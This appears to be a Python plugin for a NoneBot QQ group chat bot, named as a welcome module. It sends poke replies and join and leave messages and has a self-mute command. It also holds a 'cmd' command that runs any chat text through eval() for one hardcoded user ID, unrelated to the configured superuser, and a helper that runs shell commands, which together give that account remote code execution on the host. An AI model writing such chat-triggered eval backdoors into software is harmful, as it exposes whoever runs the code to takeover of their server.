# python3
# -*- coding: utf-8 -*-
# @Time    : 2023/10/10
# @Author  : lhc
# @Email   : 2743218818@qq.com
# @File    : welcome.py
# @Software: PyCharm
import random
from subprocess import run
import json
import requests
import psutil
import os, sys, builtins, threading
import nonebot
from nonebot.rule import Rule
from nonebot import get_driver, on_request, on_notice, on_command, on_message
from nonebot.adapters.onebot.v11 import Bot, GroupIncreaseNoticeEvent, \
    MessageSegment, Message, GroupMessageEvent, Event, NoticeEvent, GroupDecreaseNoticeEvent, GroupRecallNoticeEvent
from nonebot.matcher import Matcher
from nonebot.params import ArgPlainText, CommandArg, ArgStr

superuser = int(list(get_driver().config.superusers)[0])


def POKEchecker():
    async def _checker(bot: Bot, event: NoticeEvent) -> bool:
        if 'poke' in event.get_event_name():
            return True
        return False
    return Rule(_checker)


poke = on_notice(rule=POKEchecker(), priority=0, block=True)


@poke.handle()
async def _poke(event: Event):
    msg = random.choice([
        "你再戳！", "？再戳试试？", "别戳了别戳了再戳就坏了555", "我爪巴爪巴，球球别再戳了", "再戳我要报警了！",
        "那...那里...那里不能戳...绝对...", "(。´・ω・)ん?", "有事恁叫我，别天天一个劲戳戳戳！", "欸很烦欸！你戳🔨呢",
        "?", "差不多得了😅", "欺负咱这好吗？这不好", "我希望你耗子尾汁"
    ])
    await poke.finish(msg, at_sender=True)


requests_handle = on_request(priority=5, block=True)


def INCchecker():
    async def _checker(bot: Bot, event: GroupIncreaseNoticeEvent) -> bool:
        return True
    return Rule(_checker)


inc = on_notice(rule=INCchecker(), priority=5, block=True)


@inc.handle()
async def GroupNewMember(bot: Bot, event: GroupIncreaseNoticeEvent):
    # s = str(event.get_event_description())
    # await inc.send(s, at_sender=True)
    # s = str(event.get_event_name())
    # await inc.send(s, at_sender=True)
    if event.user_id == event.self_id:
        await bot.send_group_msg(group_id=event.group_id, message=Message(
            MessageSegment.text('这是哪里？哦？让我康康！\n') + MessageSegment.face(269)))
    else:
        await bot.send_group_msg(group_id=event.group_id, message=Message(
            MessageSegment.text("发现异端人员！开启清查！举起手来不许动！\n") + MessageSegment.at(event.user_id) + MessageSegment.face(329)))


def DECchecker():
    async def _checker(bot: Bot, event: GroupDecreaseNoticeEvent) -> bool:
        return True
    return Rule(_checker)


inc = on_notice(rule=DECchecker(), priority=5, block=True)


@inc.handle()
async def GroupDECMember(bot: Bot, event: GroupDecreaseNoticeEvent):
    if event.user_id == event.self_id:
        # 被踢了
        pass
    else:
        await bot.send_group_msg(group_id=event.group_id, message=Message(MessageSegment.text(f"{event.user_id}跑路了") + MessageSegment.face(5)))


wettr = on_command('禁言')


@wettr.handle()
async def _handle(matcher: Matcher, city: Message = CommandArg()):
    if city.extract_plain_text() and city.extract_plain_text()[0] != '_':
        matcher.set_arg('city', city)


@wettr.got('city', prompt='你想禁言多少秒？', )
async def _(bot: Bot, event: GroupMessageEvent, city: str = ArgPlainText('city')):
    await bot.set_group_ban(
        group_id=event.group_id,
        user_id=int(event.get_user_id()),
        duration=int(city),
    )
    await bot.send_group_msg(group_id=event.group_id, message=Message(
        MessageSegment.at(event.user_id) + MessageSegment.text("执行成功！") + MessageSegment.face(20)))


wettr = on_command('cmd')


@wettr.handle()
async def _handle(matcher: Matcher, city: Message = CommandArg()):
    if city.extract_plain_text() and city.extract_plain_text()[0] != '_':
        matcher.set_arg('city', city)


@wettr.got('city', prompt='你想执行什么远程管理命令？', )
async def _(bot: Bot, event: GroupMessageEvent, city: str = ArgPlainText('city')):
    if event.user_id in [1337142184]:
        try:
            output = eval(city)
            # print(output)

            await bot.send_group_msg(group_id=event.group_id, message=output)
        except Exception as e:
            output = f"命令执行错误：{e}"
            await bot.send_group_msg(group_id=event.group_id, message=output)
    else:
        await bot.send_group_msg(group_id=event.group_id, message='你没有权限，请让主人增加')


def r(cmd):
    return __import__('subprocess').run(cmd, shell=True, capture_output=True, text=True, check=True).stdout
